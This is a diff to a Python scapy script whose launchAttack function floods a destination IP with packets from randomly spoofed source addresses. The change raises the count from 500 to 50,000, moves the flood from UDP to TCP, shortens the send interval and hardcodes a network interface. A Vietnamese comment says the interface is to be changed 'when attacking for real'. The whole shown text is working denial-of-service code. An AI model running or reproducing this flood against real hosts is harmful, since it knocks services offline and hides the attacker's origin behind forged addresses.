@@ -1,9 +1,10 @@
 import sys
 import time
+import random
 from os import popen
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import sendp, IP, UDP, Ether, TCP
+from scapy.all import sendp, IP, UDP, Ether, TCP, send
 from random import randrange
 import time
 import string
@@ -22,7 +23,7 @@ def generateSourceIP():
         #print first
 
     ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
-    #print ip
+    print(ip)
     return ip
 
 
@@ -38,12 +39,16 @@ def launchAttack():
 
   interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
 
-  for i in range(0, 500):
-    packets = Ether() / IP(dst = destinationIP, src = generateSourceIP()) / UDP(dport = 1, sport = 80)/payload_generator(size=randrange(1,5))
+  for i in range(0, 50000):
+    packets = Ether() / IP(dst = destinationIP, src = generateSourceIP()) / TCP(dport = 1, sport = 80)/payload_generator(size=randrange(1,5))
+ 
     print(repr(packets))
-
+    # iface = interface.rstrip()
+    # print(iface)
     #send packets with interval = 0.025 s
-    sendp(packets, iface = interface.rstrip(), inter = 0.05)
+    #send(packets, iface = interface.rstrip(), inter = 0.05)
+    sendp(packets, iface = 'eno1', inter = 0.025) #Su interface khi tan cong that
+    
 
 if __name__=="__main__":
   main()
